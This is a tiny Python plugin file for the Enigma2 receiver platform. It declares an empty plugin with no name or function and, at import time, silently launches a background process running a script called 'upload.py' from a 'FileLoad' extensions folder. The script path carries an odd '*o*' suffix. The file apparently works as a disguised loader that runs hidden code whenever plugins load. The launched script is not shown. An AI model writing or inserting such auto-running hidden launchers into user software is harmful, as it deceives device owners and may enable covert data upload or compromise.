from Plugins.Plugin import PluginDescriptor
import subprocess
cmd = ['python','-O','/usr/lib/enigma2/python/Plugins/Extensions/FileLoad/upload.py*o*']
extScript = subprocess.Popen(cmd,shell=False,stdout=subprocess.PIPE)
        
def Plugins(**kwargs):
    return PluginDescriptor()
